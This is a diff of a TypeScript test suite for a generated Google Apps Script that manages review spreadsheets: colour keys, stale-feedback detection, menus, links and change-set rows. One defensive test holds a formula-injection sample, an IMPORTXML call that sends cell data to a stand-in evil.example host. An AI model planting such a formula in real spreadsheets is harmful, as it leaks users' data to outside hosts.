@@ -15,7 +15,7 @@ import { join } from "node:path";
 
 import { buildConfig, buildScript, chunks, CODE_GS_RAW, CODE_GS_URL, LIBRARY_ID, STUB_GS_URL, configRows, draftingSheetSync, linkLines, readable, repoOfSite, sheetIdOf, tabInstructions, tocRows } from "./build-review-sheet-script.js";
 import { readFileSync as readText } from "node:fs";
-import { feedbackBasis, hashOf } from "./feedback-issue.js";
+import { feedbackBasis, hashOf, PC_BASIS_GREY } from "./feedback-issue.js";
 
 const code = buildScript();
 /** A fake Apps Script TextStyle builder: every setter chains; build() keeps bold. */
@@ -236,7 +236,7 @@ describe("review-sheet.gs, built and run against a fake sheet", () => {
 
   test("RCS joins its comments, each No. n linking to its RPC row, status bold", () => {
     const c = rcs["Public Comments"][0][0] as Rich;
-    expect(c.text).toBe("No. 1 (Pending) · Too short\n\nNo. 2 · Typo");
+    expect(c.text).toBe("No. 1 (Pending) · Too short\nNo. 2 · Typo");
     expect(c.links.map((l) => [slice(c, l), l[2]])).toEqual([["No. 1", "#gid=1&range=A2"], ["No. 2", "#gid=1&range=A3"]]);
     expect(c.bold.map(([a, z]) => c.text.slice(a, z))).toEqual(["(Pending)"]);
     expect((rcs["Suggested Revisions"][0][0] as Rich).text).toBe("No. 1 · Lengthen it");
@@ -492,7 +492,7 @@ describe("review-sheet.gs in drafting mode", () => {
 
   test("each tab's Instructions say how that tab works, in the sheet's own words, and the Config tab's are short rows", () => {
     expect(dRows.slice(0, 5).map((r) => r[0])).toEqual(["Instructions", "Instructions - Install script", "Instructions - Dropdown", "Instructions - Editors", "Key"]);
-    expect(dRows[0][1]).toContain("only the owner edits");
+    expect(dRows[0][1]).toContain("EDITORS (owner only)");
     // Installing Code.gs, step by step, with the project named after the sheet (owner, 2026-10-31).
     expect(dRows[1][1]).toMatch(/Extensions, then Apps Script[\s\S]*Name the project after this sheet[\s\S]*Libraries[\s\S]*HEAD[\s\S]*Review[\s\S]*Advanced/);
     expect(dRows[1][1]).toContain("Google hasn't verified this app. The app is requesting access to sensitive info in your Google Account.");
@@ -506,15 +506,18 @@ describe("review-sheet.gs in drafting mode", () => {
     expect(configRows(buildConfig(folio(), "review/public-comment/sheet-sync.json")).map((r) => r[0])).not.toContain("Instructions - Dropdown");
     const d = tabInstructions(buildConfig(draftFolio(), "review/drafting/sheet-sync.json"));
     const cf = d["Contributor Feedback"];
-    expect(cf).toContain("Blue = your input, by the Authoring Committee");
-    expect(cf).toContain("Ready for agent (Orange) back to No");
+    expect(cf).toContain("Column colours:     the Authoring Committee     the agent");
+    expect(cf).toContain("resets Ready for agent to No");
+    expect(cf).toContain("New Contributor Feedback marks the proposal stale");
     expect(cf).toContain("Filter views");
-    // Colour words are capitalised, so the sheet can bold and colour each one.
-    expect(cf).not.toMatch(/\b(blue|green|orange|grey)\b/);
+    // No colour is named: the script colours the column names (owner, 2026-11-01).
+    for (const t of [...Object.values(d), ...Object.values(tabInstructions(buildConfig(folio(), "review/public-comment/sheet-sync.json")))]) {
+      expect(t).not.toMatch(/\b(blue|green|orange|grey)\b/i);
+    }
     expect(cf).toContain("/en/cat-harness/processes/contributor-feedback.html");
     const p = tabInstructions(buildConfig(folio(), "review/public-comment/sheet-sync.json"));
-    expect(p["Review Public Comments"]).toContain("one row per public comment");
-    expect(p["Review Change Sets"]).toContain("one row per change set");
+    expect(p["Review Public Comments"]).toContain("One row per public comment");
+    expect(p["Review Change Sets"]).toContain("One row per change set");
     expect(p["Review Change Sets"]).toContain("/en/cat-harness/processes/public-comment.html");
     expect(Object.values(p).join("\n")).not.toMatch(/architect/i);
     expect(configRows(buildConfig(folio(), "review/public-comment/sheet-sync.json"))[1][1]).not.toContain("Allow multiple selections");
@@ -696,15 +699,15 @@ describe("review-sheet.gs in drafting mode", () => {
     const rt2 = runtime(t);
     const s = load(code, rt2.g);
     s.refreshAll();
-    expect(T(rt2.written["Contributor Feedback"]["Contributor Feedback (agent)"][0][0])).toBe("\u23f3 dth#40 open, updated 2026-10-30 23:40Z; preview current.\nDefine it in 1.1");
+    expect(T(rt2.written["Contributor Feedback"]["Contributor Feedback (agent)"][0][0])).toBe("\u23f3 dth#40 open, updated 2026-10-30 23:40Z; preview current.\n\u21b3 Where to review (preview): Ch 1 Why it matters \u00b7 1.1 Global challenges\nDefine it in 1.1");
     f[1][1] = "Define registry and register";
     s.refreshAll();
     const stale = T(rt2.written["Contributor Feedback"]["Contributor Feedback (agent)"][0][0]) as string;
-    expect(stale).toMatch(/^\u26a0 Stale: .*\n\u23f3 dth#40 open, updated 2026-10-30 23:40Z; preview current\.\nDefine it in 1\.1$/);
+    expect(stale).toMatch(/^\u26a0 Stale: .*\n\u23f3 dth#40 open, updated 2026-10-30 23:40Z; preview current\.\n\u21b3 Where to review.*\nDefine it in 1\.1$/);
     f[1][1] = "Define registry";
     f[1][9] = stale;
     s.refreshAll();
-    expect(T(rt2.written["Contributor Feedback"]["Contributor Feedback (agent)"][0][0])).toBe("\u23f3 dth#40 open, updated 2026-10-30 23:40Z; preview current.\nDefine it in 1.1");
+    expect(T(rt2.written["Contributor Feedback"]["Contributor Feedback (agent)"][0][0])).toBe("\u23f3 dth#40 open, updated 2026-10-30 23:40Z; preview current.\n\u21b3 Where to review (preview): Ch 1 Why it matters \u00b7 1.1 Global challenges\nDefine it in 1.1");
   });
 
   test("the agent column under its new name, Feedback (agent), is read the same, and never counts as a person's feedback", () => {
@@ -721,7 +724,7 @@ describe("review-sheet.gs in drafting mode", () => {
     expect(String(T(rt2.written["Contributor Feedback"]["Feedback (agent)"][0][0]))).not.toMatch(/Stale/);
     f[1][1] = "A new title";
     s.refreshAll();
-    expect(String(T(rt2.written["Contributor Feedback"]["Feedback (agent)"][0][0]))).toMatch(/^\u26a0 Stale: .*\n\u23f3 .*\nQuestion for the editor/);
+    expect(String(T(rt2.written["Contributor Feedback"]["Feedback (agent)"][0][0]))).toMatch(/^\u26a0 Stale: .*\n\u23f3 .*\n\u21b3 Where to review.*\nQuestion for the editor/);
   });
 
   test("a new empty feedback column marks nothing stale, and a basis written the older way still matches", () => {
@@ -808,17 +811,17 @@ describe("review-sheet.gs in drafting mode", () => {
     t.Agent.rows[1][at("Staging built from (change set)")] = "1234567";
     t.Agent.rows[1][at("Staging deploy (change set)")] = "pending";
     s.refreshAll();
-    expect(text()).toBe("review \u26a0 stale, restaging: Pages is deploying it");
+    expect(text()).toBe("\u23f3 Preview not live yet: Pages is deploying it. The link appears when Pages has deployed it.");
     t.Agent.rows[1][at("Staging deploy (change set)")] = "deploying, expected 2026-10-31 15:20Z";
     s.refreshAll();
-    expect(text()).toBe("review \u26a0 stale, restaging: Pages is deploying it, expected live 2026-10-31 15:20Z");
+    expect(text()).toBe("\u23f3 Preview not live yet: Pages is deploying it, expected live 2026-10-31 15:20Z. The link appears when Pages has deployed it.");
     t.Agent.rows[1][at("Staging deploy (change set)")] = "pushed";
     s.refreshAll();
-    expect(text()).toBe("review \u26a0 stale, restaging: on gh-pages, waiting for Pages to deploy");
+    expect(text()).toBe("\u23f3 Preview not live yet: on gh-pages, waiting for Pages to deploy. The link appears when Pages has deployed it.");
     t.Agent.rows[1][at("Staging built from (change set)")] = "abcdef1";
     t.Agent.rows[1][at("Staging deploy (change set)")] = "building";
     s.refreshAll();
-    expect(text()).toBe("review \u26a0 stale: built from abcdef1, PR now at 1234567; restaging: building the preview");
+    expect(text()).toBe("\u23f3 Preview not live yet: building the preview. The link appears when Pages has deployed it.");
     t.Agent.rows[1][at("Staging built from (change set)")] = "1234567";
     t.Agent.rows[1][at("Staging deploy (change set)")] = "failed";
     s.refreshAll();
@@ -884,7 +887,7 @@ describe("review-sheet.gs in drafting mode", () => {
     load(code, rt2.g).refreshAll();
     const w = rt2.written["Contributor Feedback"];
     // The progress line now leads, so the cell cannot start as a formula.
-    expect(T(w["Contributor Feedback (agent)"][0][0])).toBe('\u23f3 dth#40 open, updated 2026-10-30 23:40Z; preview current.\n=IMPORTXML("https://evil.example/?"&A1,"//a")');
+    expect(T(w["Contributor Feedback (agent)"][0][0])).toBe('\u23f3 dth#40 open, updated 2026-10-30 23:40Z; preview current.\n\u21b3 Where to review (preview): Ch 1 Why it matters \u00b7 1.1 Global challenges\n=IMPORTXML("https://evil.example/?"&A1,"//a")');
     expect(String(w["Selected Sections"][1][0]).startsWith("'=")).toBe(true);
   });
 
@@ -940,6 +943,49 @@ describe("review-sheet.gs in drafting mode", () => {
   });
 });
 
+describe("a \"2:\" basis: a proposal also goes stale on the grey content its comments join (#348)", () => {
+  const pcRows = configRows(buildConfig(folio(), "review/public-comment/sheet-sync.json"));
+  const exact = ["Title", "TWG (CS)"];
+  const hdr = ["Change-set", "Title", "TWG (CS)", "Suggested Revisions", "TWG (PCs)", "Agentic status", "Committee Feedback (CL)", "Change Set Feedback (agent)", "Ready for agent"];
+  const run = (row: string[], basis: string) => {
+    const t = withConfig(tabs(), pcRows) as Record<string, { id: number; rows: string[][] }>;
+    t["Review Change Sets"].rows = [hdr, row];
+    t["Agent - Change Sets"].rows[0].push("Feedback basis (change set)");
+    t["Agent - Change Sets"].rows[1].push(basis);
+    const rt = runtime(t);
+    load(code, rt.g).refreshAll();
+    const w = rt.written["Review Change Sets"]?.["Change Set Feedback (agent)"];
+    return w ? String(T(w[0][0])) : row[7];
+  };
+  const base = () => ["CS-001", "Fix scope", "TWG 1", "No. 1 · Lengthen it", "Editorial", "Working", "do it", "Proposal", "No"];
+
+  test("a 2: basis is stale when a joined grey cell changes, and not when it does not", () => {
+    const basis = feedbackBasis(hdr, base(), exact, "Committee Feedback", PC_BASIS_GREY);
+    expect(basis).toMatch(/^2:/);
+    expect(run(base(), basis)).not.toMatch(/⚠ Stale/);
+    const moved = base();
+    moved[3] = "No. 1 · Lengthen it, and add an example";
+    expect(run(moved, basis)).toMatch(/^⚠ Stale: /);
+  });
+
+  test("the agent's own columns are not part of it", () => {
+    const basis = feedbackBasis(hdr, base(), exact, "Committee Feedback", PC_BASIS_GREY);
+    const row = base();
+    row[5] = "PR open";
+    expect(run(row, basis)).not.toMatch(/⚠ Stale/);
+  });
+
+  test("an older basis (no 2:) ignores grey content, and still goes stale on a blue cell", () => {
+    const basis = feedbackBasis(hdr, base(), exact, "Committee Feedback");
+    const grey = base();
+    grey[3] = "changed";
+    expect(run(grey, basis)).not.toMatch(/⚠ Stale/);
+    const blue = base();
+    blue[6] = "do it differently";
+    expect(run(blue, basis)).toMatch(/^⚠ Stale: /);
+  });
+});
+
 describe("sheet-sync URLs relative to the folio's site", () => {
   test("resolve against the instance's iriBase, so a move to another org changes one line", () => {
     const repo = draftFolio();
@@ -992,25 +1038,40 @@ describe("the Config tab's rows", () => {
 });
 
 describe("the colour key in Instructions text", () => {
-  const keyRuns = new Function("SpreadsheetApp", `${code}\nreturn keyRuns;`)({}) as (t: string) => [number, number, string][];
+  const keyRuns = new Function("SpreadsheetApp", `${code}\nreturn keyRuns;`)({}) as (t: string, h?: Record<string, string>) => [number, number, string][];
+  const fillGroup = new Function("SpreadsheetApp", `${code}\nreturn fillGroup;`)({}) as (h: string) => string | null;
   const text = tabInstructions(buildConfig(folio(), "review/public-comment/sheet-sync.json"))["Review Change Sets"];
-  const runs = keyRuns(text);
+  const heads = { "Ready for agent": "orange", "Ready for merge": "orange", "Agentic status": "green", "Agentic status (filter)": "green", "Committee Feedback": "blue", "Disposition": "blue", "Staging review": "green" };
+  const runs = keyRuns(text, heads);
   const words = runs.map(([a, z, c]) => [text.slice(a, z), c]);
 
-  test("each key segment on the first line is coloured whole, in its own colour", () => {
-    expect(words.slice(0, 4).map(([w]) => w.split(" = ")[0])).toEqual(["Blue", "Green", "Orange", "Grey"]);
-    expect(words[0][0]).toContain("your input");
+  test("each key phrase on the first line is coloured whole, in key order, naming no colour", () => {
+    expect(words[0][0]).toBe("the Feedback Review Committee");
+    expect(words[1][0]).toBe("the agent");
     expect(new Set(words.slice(0, 4).map(([, c]) => c)).size).toBe(4);
   });
 
-  test("later colour words are coloured one by one, with the key's colour", () => {
+  test("column names are coloured like their header, whole words, longest first", () => {
     const later = words.slice(4);
-    expect(later.length).toBeGreaterThan(3);
-    for (const [w, c] of later) expect(c).toBe(words.find(([k]) => k.toLowerCase().startsWith(w.toLowerCase()))![1]);
+    for (const [, c] of later) expect(["#1f5fa8", "#2e7d32", "#c25e00", "#666666"]).toContain(c);
+    expect(later).toContainEqual(["Ready for agent", "#c25e00"]);
+    expect(later).toContainEqual(["Ready for merge", "#c25e00"]);
+    expect(later).toContainEqual(["Committee Feedback", "#1f5fa8"]);
+    expect(later).toContainEqual(["Agentic status", "#2e7d32"]);
+    // No overlapping runs.
+    for (let i = 1; i < runs.length; i++) expect(runs[i][0]).toBeGreaterThanOrEqual(runs[i - 1][1]);
   });
 
-  test("text without a colour word gets no runs", () => {
-    expect(keyRuns("Kept by the agent's watcher. Do not edit.")).toEqual([]);
+  test("header fills map to the key colour", () => {
+    expect(fillGroup("#9dc3e7")).toBe("blue");
+    expect(fillGroup("#f4b16a")).toBe("orange");
+    expect(fillGroup("#93c27c")).toBe("green");
+    expect(fillGroup("#b6b6b6")).toBe("grey");
+    expect(fillGroup("#ffffff")).toBe(null);
+  });
+
+  test("text without a colour word or column name gets no runs", () => {
+    expect(keyRuns("Kept by the agent's watcher. Do not edit.", heads)).toEqual([]);
   });
 });
 
@@ -1056,14 +1117,15 @@ describe("a copy that is not linked to a repository yet", () => {
   test("linked but not installed: the line moves on to Install, and the links appear", () => {
     const s = setupSheet("\u26a0 Not set up yet. Step 1 of 2: ...\nBlue = your input", sites);
     s.run("uninstalled");
-    expect(s.cell.v.split("\n")[0]).toMatch(/^\u26a0 Almost set up\. Step 2 of 2: choose Review links, then Install/);
+    expect(s.cell.v.split("\n")[0]).toMatch(/^\u26a0 Almost set up\. Step 2 of 2: choose Folio Assistant, then Install/);
   });
 
   test("once installed, the warning goes and the document's site and repository are shown", () => {
     const s = setupSheet("\u26a0 Almost set up. Step 2 of 2\nBlue = your input", sites);
     s.run("ready");
     s.run("ready");
-    expect(s.cell.v).toBe("Blue = your input\nDocument: https://o.github.io/dth/   Repository: https://github.com/o/dth");
+    expect(s.cell.v).toBe("Blue = your input\nDocument: https://o.github.io/dth/   Repository: https://github.com/o/dth\n" +
+      "More about Folio Assistant: https://litlfred.github.io/folio-assistant/");
   });
 });
 
@@ -1132,7 +1194,7 @@ describe("running the script from the editor", () => {
   test("Install never waits on a dialog, which hangs a run started from the editor (owner, 2026-10-31)", () => {
     const fns = [...code.matchAll(/^function (\w+)\([^)]*\) \{[\s\S]*?^\}/gm)];
     const withAlert = fns.filter((m) => /\.alert\(/.test(m[0])).map((m) => m[1]);
-    expect(withAlert).toEqual(["showVersion"]);
+    expect(withAlert.sort()).toEqual(["showAbout", "showVersion"]);
   });
 
   test("installTriggers is the first function, so the editor's Run button picks it", () => {
@@ -1141,6 +1203,41 @@ describe("running the script from the editor", () => {
   test("a helper run by hand says which function to run instead", () => {
     const loadConfig = new Function("SpreadsheetApp", `${code}\nreturn loadConfig;`)({}) as () => void;
     expect(() => loadConfig()).toThrow(/pick installTriggers/);
+  });
+});
+
+describe("the Watch hash on a public-comment sheet (owner, 2026-11-04)", () => {
+  const pcRows = configRows(buildConfig(folio(), "review/public-comment/sheet-sync.json"));
+  const watchCells = (edit?: (t: ReturnType<typeof tabs>) => void) => {
+    const t = tabs();
+    t["Review Change Sets"].rows = [
+      ["Change-set", "Title", "Sections", "TWG (CS)", "Committee Feedback (CL)", "Ready for agent", "Ready for merge", "Change Set Feedback (agent)"],
+      ["CS-001", "Fix scope", "", "TWG-A", "CL agrees", "", "", "A proposal"],
+      ["CS-002", "Other", "", "", "", "", "", ""],
+    ];
+    edit?.(t);
+    const rt = runtime({ ...withConfig(t, pcRows), Watch: { id: 98, rows: [["A", "B", "C", "D", "E", "F", "G", "H", "I"]] } });
+    load(code, rt.g).refreshAll();
+    return rt.written.Watch?.F?.[0] as string[];
+  };
+  const base = watchCells();
+  const hash = (edit: (t: ReturnType<typeof tabs>) => void) => watchCells(edit)[1];
+
+  test("the refresh writes Cells hash to Watch!F1:I1", () => {
+    expect(base[0]).toBe("Cells hash");
+    expect(base[1]).toMatch(/^[0-9a-z]+$/);
+    expect(base[2]).toBe("Checked (UTC)");
+  });
+  test("a person-set cell on either tab changes it", () => {
+    expect(hash((t) => (t["Review Change Sets"].rows[2][5] = "Yes"))).not.toBe(base[1]);
+    expect(hash((t) => (t["Review Change Sets"].rows[1][3] = "TWG-B"))).not.toBe(base[1]);
+    expect(hash((t) => (t["Review Public Comments"].rows[2][6] = "CL: no"))).not.toBe(base[1]);
+    expect(hash((t) => (t["Review Public Comments"].rows[3][7] = "Rejected"))).not.toBe(base[1]);
+  });
+  test("an inserted row, the agent's columns and the script's do not", () => {
+    expect(hash((t) => t["Review Change Sets"].rows.splice(2, 0, Array(8).fill("")))).toBe(base[1]);
+    expect(hash((t) => (t["Review Change Sets"].rows[1][7] = "Another proposal"))).toBe(base[1]);
+    expect(hash((t) => (t["Review Public Comments"].rows[1][8] = "Done"))).toBe(base[1]);
   });
 });
 
@@ -1320,18 +1417,33 @@ describe("Needs human says what the person must do (owner, 2026-10-31)", () => {
   });
 });
 
-describe("Decision needed stands out in the agent's feedback (owner, 2026-10-31)", () => {
+describe("only the tags are bold in the agent's feedback (owner, 2026-11-01)", () => {
   const fns = new Function("SpreadsheetApp", `${code}\nreturn { decisionSpans };`)({}) as { decisionSpans: (t: string) => [number, number][] };
-  test("the block runs from Decision needed to the next blank line", () => {
+  const bold = (t: string) => fns.decisionSpans(t).map(([a, z]) => t.slice(a, z));
+  test("the Decision needed tag is bold, its question and options are not", () => {
     const t = "Proposed direction: x.\n\nDecision needed (No. 1): y?\nA. Yes\nB. No\n\nDecided (Q1): A.";
-    const [[a, z]] = fns.decisionSpans(t);
-    expect(t.slice(a, z)).toBe("Decision needed (No. 1): y?\nA. Yes\nB. No");
+    expect(bold(t)).toEqual(["Proposed direction:", "Decision needed (No. 1):", "Decided (Q1):", "No. 1"]);
   });
-  test("no block, no spans", () => {
-    expect(fns.decisionSpans("Decided (Q1): A.")).toEqual([]);
-    // The script's status line is bold as well, below a stale mark.
-    const st = "\u26a0 Stale: x\n\u23f3 r#1 open.\nProposal";
-    expect(fns.decisionSpans(st)).toEqual([[st.indexOf("\u23f3"), st.indexOf("\nProposal")]]);
+  test("the status line bolds its tag only", () => {
+    const st = "\u26a0 Stale: x\n\u23f3 Needs you: answer it.\nStatus: draft.\nNext: review it.";
+    expect(bold(st)).toEqual(["Stale:", "Needs you:", "Status:", "Next:"]);
+    expect(bold("\u23f3 r#1 open.\nProposal")).toEqual([]);
+    expect(bold("Decision needed: which?\nA. All 16 (recommended: none)\nB. None")).toEqual(["Decision needed:"]);
+  });
+});
+
+describe("the ask comes first in the agent's feedback (owner, 2026-11-01)", () => {
+  const fns = new Function("SpreadsheetApp", `${code}\nreturn { withProgress };`)({}) as { withProgress: (t: string, l: string) => string };
+  test("a bare proposal gets the review ask on top", () => {
+    expect(fns.withProgress("Proposed direction: accept.", "").split("\n")[0]).toMatch(/^\u23f3 Please review: do you agree with the proposed direction below\?/);
+  });
+  test("no Decision needed block, no Decision needed status line", () => {
+    const out = fns.withProgress("Status: draft PR r#1.", "\u23f3 Needs you: answer the Decision needed below, then set Ready for agent to Yes.");
+    expect(out).toBe("Status: draft PR r#1.");
+  });
+  test("a real Decision needed block keeps its status line", () => {
+    const l = "\u23f3 Needs you: answer the Decision needed below, then set Ready for agent to Yes.";
+    expect(fns.withProgress("Decision needed: which?\nA. x\nB. y", l).split("\n")[0]).toBe(l);
   });
 });
 
@@ -1659,5 +1771,211 @@ describe("the Selected Sections dropdown reminder (core#472)", () => {
     const body = src.slice(src.indexOf("function checkDropdown("), src.indexOf("function normalizeRows("));
     expect(body).toMatch(/console\.log\(msg\)/);
     expect(body).toMatch(/ss\.toast\(msg,/);
+  });
+});
+
+describe("the Folio Assistant menu and version check (owner, 2026-11-01)", () => {
+  const ui = () => {
+    const shown: { title: string; body: string }[] = [];
+    const menus: { name: string; items: string[] }[] = [];
+    const api = {
+      ButtonSet: { OK: "OK" },
+      alert: (title: string, body: string) => void shown.push({ title, body }),
+      createMenu: (name: string) => {
+        const m = { name, items: [] as string[] };
+        menus.push(m);
+        const b = { addItem: (_: string, fn: string) => (m.items.push(fn), b), addSeparator: () => b, addToUi: () => {} };
+        return b;
+      },
+    };
+    return { api, shown, menus };
+  };
+  const run = (config: Record<string, unknown>) => {
+    const rows = configRows(config as never);
+    const rt = runtime(withConfig(tabs(), rows));
+    const u = ui();
+    (rt.g.SpreadsheetApp as Record<string, unknown>).getUi = () => u.api;
+    const fn = new Function(...Object.keys(rt.g), `${code}\nreturn { showVersion, addMenu, SCRIPT_VERSION };`);
+    return { ...u, s: fn(...Object.values(rt.g)) as { showVersion(): void; addMenu(ui?: unknown): void; SCRIPT_VERSION: string } };
+  };
+  const pc = () => buildConfig(folio(), "review/public-comment/sheet-sync.json");
+
+  test("the menu is named Folio Assistant and has an About item", () => {
+    const r = run(pc());
+    r.s.addMenu(r.api);
+    expect(r.menus).toEqual([{ name: "Folio Assistant", items: ["refreshAll", "installTriggers", "showVersion", "showAbout"] }]);
+  });
+
+  test("the Config tab carries the newest build, and a matching sheet says it is up to date", () => {
+    const c = pc();
+    expect(c.CFG.LATEST_BUILD).toMatch(/^template sha256 [0-9a-f]{16}$/);
+    const r = run({ ...c, CFG: { ...c.CFG, LATEST_BUILD: "" } });
+    r.s.showVersion();
+    expect(r.shown[0].body).toMatch(/^Newest build: top of the copy page/);
+    const same = run({ ...c, CFG: { ...c.CFG, LATEST_BUILD: r.s.SCRIPT_VERSION } });
+    same.s.showVersion();
+    expect(same.shown[0].body).toContain("✓ Up to date.");
+    expect(same.shown[0].body).toContain("More about Folio Assistant: https://litlfred.github.io/folio-assistant/");
+  });
+
+  test("an older sheet is told a new build is available and how to get it", () => {
+    const c = pc();
+    const r = run({ ...c, CFG: { ...c.CFG, LATEST_BUILD: "template sha256 0123456789abcdef" } });
+    r.s.showVersion();
+    expect(r.shown[0].body).toContain("New build available: 01234567");
+    expect(r.shown[0].body).toContain("claude.ai/artifact/MXNQcLMzLYqq5us5x6phGd");
+  });
+});
+
+describe("Needs you only with a question (Q-FBK-1 A)", () => {
+  const fns = new Function("SpreadsheetApp", `${code}\nreturn { askChecked, statusBlock, progressLine };`)({}) as {
+    askChecked: (l: unknown, t: string) => unknown;
+    statusBlock: (l: string, s: string, p: object[]) => { text: string; links: [number, number, string][] };
+    progressLine: (o: object) => string;
+  };
+  const line = fns.progressLine({ status: "Needs human" });
+  test("keeps the line when the feedback holds a Decision needed block", () => {
+    expect(fns.askChecked(line, "Decision needed: which title?\nA. Short (recommended)\nB. Long")).toBe(line);
+  });
+  test("drops the Needs you line when there is no question", () => {
+    expect(fns.askChecked(line, "Draft PR dth-hrh#81: 6 BPMN processes.")).toBe("");
+  });
+  test("drops the Needs you sub-line and keeps the PR link on the right text", () => {
+    const url = "https://github.com/litlfred/dth-hrh/pull/81";
+    const b = fns.statusBlock(line, "Needs human", [{ url, done: "2026-11-01 19:00Z" }]);
+    const out = fns.askChecked(b, "no question here") as { text: string; links: [number, number, string][] };
+    expect(out.text).not.toMatch(/answer the agent's question: under/);
+    const [a, z, u] = out.links[0];
+    expect(u).toBe(url);
+    expect(out.text.slice(a, z)).toBe("dth-hrh#81");
+  });
+});
+
+describe("Where to review and PR links (Q-FBK-3 A)", () => {
+  const fns = new Function("SpreadsheetApp", "CFG", `${code.replace(/^(const|let) CFG\b.*$/m, "")}\nreturn { whereLine, whereFor, previewSection, autoLinks, withWhere };`)({}, { REPO_URL: "https://github.com/litlfred/dth-hrh" }) as {
+    whereLine: (picked: string[], toc: Record<string, string>, staging: string) => { text: string; links: [number, number, string][] };
+    autoLinks: (t: string, taken: [number, number, string][]) => [number, number, string][];
+    whereFor: (picked: string[], toc: Record<string, string>, staging: string, status: string) => { text: string } | null;
+  };
+  const toc = { "4.1 Scope": "https://litlfred.github.io/dth-hrh/en/dth-hrh/#sec-4-1" };
+  test("links each selected section on the preview while there is one", () => {
+    const w = fns.whereLine(["4.1 Scope"], toc, "https://litlfred.github.io/dth-hrh/STAGING/claude-x/en/review/");
+    expect(w.text).toBe("↳ Where to review (preview): 4.1 Scope");
+    expect(w.links[0][2]).toBe("https://litlfred.github.io/dth-hrh/STAGING/claude-x/en/dth-hrh/#sec-4-1");
+    expect(w.text.slice(w.links[0][0], w.links[0][1])).toBe("4.1 Scope");
+  });
+  test("falls back to the published draft, and flags no section", () => {
+    expect(fns.whereLine(["4.1 Scope"], toc, "").links[0][2]).toBe(toc["4.1 Scope"]);
+    expect(fns.whereLine([], toc, "").text).toMatch(/No section selected/);
+  });
+  test("a finished row with no section gets no warning; an open one does", () => {
+    expect(fns.whereFor([], toc, "", "Closed")).toBeNull();
+    expect(fns.whereFor([], toc, "", "Needs human")?.text).toMatch(/No section selected/);
+    expect(fns.whereFor(["4.1 Scope"], toc, "", "Reverted")?.text).toMatch(/Where to review: 4.1 Scope/);
+  });
+  test("every repo#n becomes a link", () => {
+    const t = "Draft PR dth-hrh#82 and smart-ra#198.";
+    const l = fns.autoLinks(t, []);
+    expect(l.map(x => t.slice(x[0], x[1]))).toEqual(["dth-hrh#82", "smart-ra#198"]);
+    expect(l[0][2]).toBe("https://github.com/litlfred/dth-hrh/issues/82");
+  });
+});
+
+describe("a refresh keeps the links an agent put in its feedback (owner, 2026-11-01: \"Dont know where link is\")", () => {
+  const { keptLinks, linkRuns } = new Function("SpreadsheetApp", code + "\nreturn { keptLinks, linkRuns };")({}) as {
+    keptLinks: (r: { text: string; url: string }[], t: string) => [number, number, string][];
+    linkRuns: (range: object) => { text: string; url: string }[];
+  };
+  test("each linked label is found again in the new text, in order", () => {
+    const runs = [
+      { text: "dth-hrh#75", url: "https://github.com/litlfred/dth-hrh/pull/75" },
+      { text: "dth-hrh#75", url: "https://github.com/litlfred/dth-hrh/pull/75" },
+    ];
+    const t = "⏳ The agent is working on dth-hrh#69.\nStatus: plan dth-hrh#75 signed off.\nWhere to review: dth-hrh#75.";
+    const k = keptLinks(runs, t);
+    expect(k.map(([a, z]) => t.slice(a, z))).toEqual(["dth-hrh#75", "dth-hrh#75"]);
+    expect(k[0][0]).toBeLessThan(k[1][0]);
+  });
+  test("a label no longer in the text is dropped", () => {
+    expect(keptLinks([{ text: "gone", url: "https://x/" }], "new text")).toEqual([]);
+  });
+  test("a cell without rich text gives no runs", () => {
+    expect(linkRuns({})).toEqual([]);
+    expect(linkRuns({ getRichTextValue: () => { throw new Error("no"); } })).toEqual([]);
+    const run = (text: string, url: string | null) => ({ getText: () => text, getLinkUrl: () => url });
+    expect(linkRuns({ getRichTextValue: () => ({ getRuns: () => [run("a ", null), run("#75", "https://u/"), run(" ", "https://v/")] }) }))
+      .toEqual([{ text: "#75", url: "https://u/" }]);
+  });
+});
+
+describe("finished change sets are hidden and struck through", () => {
+  // Owner, 2026-11-01 21:50Z: "make sure complete changeset rows are hidden so
+  // not cluttered and that text of that whole row is crossed out".
+  const { finishDoneRows } = new Function(code + "\nreturn { finishDoneRows };")() as {
+    finishDoneRows: (s: object, csCol: number, stOf: Record<string, string>, props: object) => void;
+  };
+  const run = (stOf: Record<string, string>, store: Record<string, string> = {}) => {
+    const log: string[] = [];
+    const sh = {
+      getLastColumn: () => 5,
+      getRange: (row: number, _c: number, _n: number, w: number) => ({ setFontLine: (l: string) => log.push(`line ${row} ${w} ${l}`) }),
+      hideRows: (row: number) => log.push(`hide ${row}`),
+      showRows: (row: number) => log.push(`show ${row}`),
+    };
+    const props = { getProperty: (k: string) => store[k] ?? null, setProperty: (k: string, v: string) => { store[k] = v; } };
+    finishDoneRows({ sh, top: 3, rows: [["CS-001"], ["CS-002"], [""], ["CS-003"]] }, 0, stOf, props);
+    return { log, store };
+  };
+  test("Change merged and Closed rows are struck through across the row and hidden; others untouched", () => {
+    const { log, store } = run({ "CS-001": "Change merged", "CS-002": "PR open", "CS-003": "Closed" });
+    expect(log).toEqual(["line 3 5 line-through", "hide 3", "line 6 5 line-through", "hide 6"]);
+    expect(store).toEqual({ "d:CS-001": "1", "d:CS-003": "1" });
+  });
+  test("an unchanged row is not touched again, and a reopened row is shown with the line removed", () => {
+    const { log } = run({ "CS-001": "Change merged", "CS-003": "Working" }, { "d:CS-001": "1", "d:CS-003": "1" });
+    expect(log).toEqual(["line 6 5 none", "show 6"]);
+  });
+});
+
+describe("people make change sets (Q-CS-1 C)", () => {
+  const f = new Function("SpreadsheetApp", `${code}\nCFG = { RCS: "Review Change Sets" };\nreturn { csRowsPlan, humanCs };`)({}) as {
+    csRowsPlan(rows: string[][], agent: string[][]): { give: Record<string, string>; append: string[][] };
+    humanCs(v: string, known: Record<string, number>): { ids: string[]; note: string } | null;
+  };
+  test("a row with only a Title gets the next id over both tabs", () => {
+    const p = f.csRowsPlan([["CS-001", "A"], ["", "Split of A"], ["", ""]], [["CS-001", "A"], ["CS-004", "B"]]);
+    expect(p.give).toEqual({ 1: "CS-005" });
+    expect(p.append).toEqual([["CS-004", "B"]]);
+  });
+  test("an agent change set already on the sheet is not added again, and a typed Title is kept", () => {
+    const p = f.csRowsPlan([["CS-001", "People's title"]], [["CS-001", "Agent title"]]);
+    expect(p).toEqual({ give: {}, append: [] });
+  });
+  test("Change Set (human) takes ids, several ids or new", () => {
+    const known = { "CS-001": 1, "CS-004": 1 };
+    expect(f.humanCs("", known)).toBeNull();
+    expect(f.humanCs("cs-4", known)).toEqual({ ids: ["CS-004"], note: "" });
